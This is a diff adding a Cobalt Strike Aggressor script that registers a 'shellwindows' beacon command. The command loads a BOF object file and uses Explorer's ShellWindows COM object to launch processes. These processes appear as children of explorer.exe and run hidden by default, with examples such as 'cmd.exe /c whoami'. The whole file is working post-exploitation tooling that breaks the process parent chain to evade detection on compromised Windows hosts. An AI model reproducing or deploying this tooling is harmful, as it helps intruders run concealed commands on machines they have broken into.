@@ -1,0 +1,56 @@
+# shellwindows.cna - Explorer ShellWindows COM 断链 BOF
+# 通过 Explorer.exe 的 COM 对象启动进程，父进程为 explorer.exe
+
+alias shellwindows {
+    local('$bid $target $cmdargs $dir $show $barch $handle $data $args');
+
+    $bid = $1;
+    $target = $2;
+
+    if ($target eq "" || $target eq $null) {
+        berror($bid, "Usage: shellwindows <target_exe> [args] [dir] [show]");
+        berror($bid, "  target_exe - Full path to executable");
+        berror($bid, "  args       - Command line arguments (optional)");
+        berror($bid, "  dir        - Working directory (optional, default: C:\\)");
+        berror($bid, "  show       - 0=hidden, 1=normal (optional, default: 0)");
+        berror($bid, "Example: shellwindows C:\\Windows\\System32\\cmd.exe \"/c whoami\" C:\\ 0");
+        return;
+    }
+
+    $cmdargs = iff($3 eq $null, "", $3);
+    $dir     = iff($4 eq $null, "C:\\", $4);
+    $show    = iff($5 eq $null, 0, int($5));
+
+    $barch = barch($bid);
+
+    $handle = openf(script_resource("shellwindows. $+ $barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    if (strlen($data) == 0) {
+        berror($bid, "Could not read BOF file for arch: $barch");
+        return;
+    }
+
+    btask($bid, "Launching $target via Explorer ShellWindows COM (parent = explorer.exe)");
+
+    $args = bof_pack($bid, "ZZZi", $target, $cmdargs, $dir, $show);
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "shellwindows",
+    "Execute process via Explorer ShellWindows COM unchaining (parent = explorer.exe)",
+    "Usage: shellwindows <target_exe> [args] [dir] [show]\n\n" .
+    "Launches a process through Explorer's ShellWindows COM object.\n" .
+    "The spawned process will have explorer.exe as its parent.\n\n" .
+    "Arguments:\n" .
+    "  target_exe - Full path to executable\n" .
+    "  args       - Command line arguments (optional)\n" .
+    "  dir        - Working directory (optional, default: C:\\)\n" .
+    "  show       - 0=hidden, 1=normal (optional, default: 0)\n\n" .
+    "Examples:\n" .
+    "  shellwindows C:\\Windows\\System32\\cmd.exe \"/c whoami\" C:\\ 0\n" .
+    "  shellwindows C:\\Windows\\System32\\calc.exe \"\" C:\\ 1\n" .
+    "  shellwindows C:\\Windows\\System32\\notepad.exe"
+);
